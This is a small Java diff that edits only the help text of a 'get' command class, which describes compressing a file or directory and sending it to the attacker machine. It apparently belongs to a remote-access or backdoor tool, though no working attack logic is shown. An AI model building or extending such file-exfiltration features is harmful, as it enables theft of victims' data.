@@ -10,7 +10,7 @@ public class GetCommand extends Command{
 	private String _command;
 	
 	public GetCommand() {
-		super("get", "\"file/dir\"", "compress and sends the specified file/dir to the attacker's machine");
+		super("get", "\"file/dir\"", "compress and sends the specified file/dir to the attacker machine");
 	}
 
 	protected boolean parse(String command) {
